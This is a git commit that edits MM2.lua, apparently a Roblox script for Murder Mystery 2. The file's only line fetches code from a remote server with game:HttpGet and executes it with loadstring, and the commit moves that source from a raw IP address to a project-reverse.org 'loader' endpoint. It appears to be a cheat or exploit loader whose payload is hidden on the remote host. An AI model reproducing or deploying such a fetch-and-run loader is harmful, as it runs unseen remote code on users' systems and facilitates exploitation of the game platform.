76c6785c4672a91f24c6e3db76d8ebe4d0ac29e9
Anonimo221123 <misaelgarciaparedes2782009@gmail.com>
2026-03-24 17:13:41 -0500

    Update URL in loadstring function

--- MM2.lua
+++ MM2.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImU3ZGEzOWYzLTU5NGUtNDBmOS1hMDllLTRlNmQ3N2VkMjY4YyIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU3ZGEzOWYzLTU5NGUtNDBmOS1hMDllLTRlNmQ3N2VkMjY4YyIsImtpbmQiOiJsb2FkZXIifQ"))()
